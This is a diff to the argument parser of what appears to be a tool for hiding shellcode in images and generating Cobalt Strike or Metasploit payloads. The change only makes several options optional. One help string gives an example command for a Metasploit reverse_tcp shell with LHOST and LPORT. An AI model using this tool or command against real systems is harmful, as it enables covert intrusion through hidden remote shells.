@@ -56,7 +56,7 @@ if __name__ == '__main__':
     parser.add_argument('command', type=str, metavar='<command>', help=f'One of {command_handlers.keys()}')
 
     # embed
-    shellcode_source = parser.add_mutually_exclusive_group(required=True)
+    shellcode_source = parser.add_mutually_exclusive_group()
     shellcode_source.add_argument('-f', dest='sc_file', type=str, help='Shellcode file')
     shellcode_source.add_argument('--sc', dest='sc', type=os.fsencode,
                                   help='Shellcode encoded as Python bytes.\n'
@@ -66,16 +66,16 @@ if __name__ == '__main__':
                                        'python main.py --sc msf://windows/reverse_tcp -i ... -o ... -- LHOST=1.1.1.1 LPORT=4444'
                                   )
 
-    parser.add_argument('-i', dest='src', type=str, help='Source image', required=True)
-    parser.add_argument('-o', dest='dst', type=str, help='Destination image', required=True)
+    parser.add_argument('-i', dest='src', type=str, help='Source image')
+    parser.add_argument('-o', dest='dst', type=str, help='Destination image')
 
     # read
-    parser.add_argument('--bits', dest='max_bits', type=str, help='Shellcode length', required=True)
+    parser.add_argument('--bits', dest='max_bits', type=str, help='Shellcode length')
 
     parser.add_argument('-a', dest='algorithm', type=str,
                         help=f'Algorithm to use. Available options: {", ".join(ALGORITHMS.keys())}')
 
-    parser.add_argument('-r', '--runner-config', dest='runner_config', type=str, help='Runner config', required=True)
+    parser.add_argument('-r', '--runner-config', dest='runner_config', type=str, help='Runner config')
     parser.add_argument('extra_options', type=str, nargs='*',
                         help='Options used when generating a Cobalt or MSF payload')
 
